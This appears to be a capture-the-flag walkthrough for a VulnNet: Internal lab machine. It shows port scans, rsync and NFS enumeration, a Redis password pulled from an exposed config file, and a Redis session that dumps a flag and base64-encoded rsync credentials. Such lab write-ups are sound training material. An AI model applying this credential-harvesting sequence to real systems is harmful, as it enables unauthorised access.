
nmap
```
└─$ nmap -sV 10.10.221.197
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-07 13:06 PDT
Nmap scan report for 10.10.221.197
Host is up (0.17s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp  open     rpcbind     2-4 (RPC #100000)
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
873/tcp  open     rsync       (protocol version 31)
2049/tcp open     nfs_acl     3 (RPC #100227)
9090/tcp filtered zeus-admin
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.40 seconds

```

```
└─$ rpcinfo -p 10.10.221.197
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  40076  mountd
    100005    1   tcp  42213  mountd
    100005    2   udp  57639  mountd
    100005    2   tcp  54979  mountd
    100005    3   udp  43024  mountd
    100005    3   tcp  47727  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049
    100003    3   udp   2049  nfs
    100227    3   udp   2049
    100021    1   udp  36267  nlockmgr
    100021    3   udp  36267  nlockmgr
    100021    4   udp  36267  nlockmgr
    100021    1   tcp  39587  nlockmgr
    100021    3   tcp  39587  nlockmgr
    100021    4   tcp  39587  nlockmgr
```

nothing in nfs share.

rsync
```
└─$ rsync 10.10.221.197::
files           Necessary home interaction

┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~/vulnNetInternal]
└─$ rsync -av --list-only rsync://10.10.221.197/files
Password: 
@ERROR: auth failed on module files
rsync error: error starting client-server protocol (code 5) at main.c(1833) [Receiver=3.2.4]

```

nfs/redis/redis.conf
```
# If the master is password protected (using the "requirepass" configuration
requirepass "B65Hx562F@ggAZ@F"
# requirepass foobared
```

```
22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                               
111/tcp   open     rpcbind     2-4 (RPC #100000)                             
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
873/tcp   open     rsync       (protocol version 31)
2049/tcp  open     nfs_acl     3 (RPC #100227)
6379/tcp  open     redis       Redis key-value store
9090/tcp  filtered zeus-admin
39587/tcp open     nlockmgr    1-4 (RPC #100021)
42213/tcp open     mountd      1-3 (RPC #100005)
42571/tcp open     java-rmi    Java RMI
47727/tcp open     mountd      1-3 (RPC #100005)
54979/tcp open     mountd      1-3 (RPC #100005)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 653.16 seconds

```

redis
```
10.10.221.197:6379> KEYS *
1) "internal flag"                                                                                                                                            
2) "marketlist"                                                                                                                                               
3) "tmp"                                                                                                                                                      
4) "int"
5) "authlist"
10.10.221.197:6379> GET "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"

```

```
10.10.221.197:6379> type "authlist"
list
10.10.221.197:6379> lrange "authlist"
(error) ERR wrong number of arguments for 'lrange' command
10.10.221.197:6379> lrange "authlist" 0 1
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
10.10.221.197:6379> lrange "authlist" 0 10
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
10.10.221.197:6379> 

```
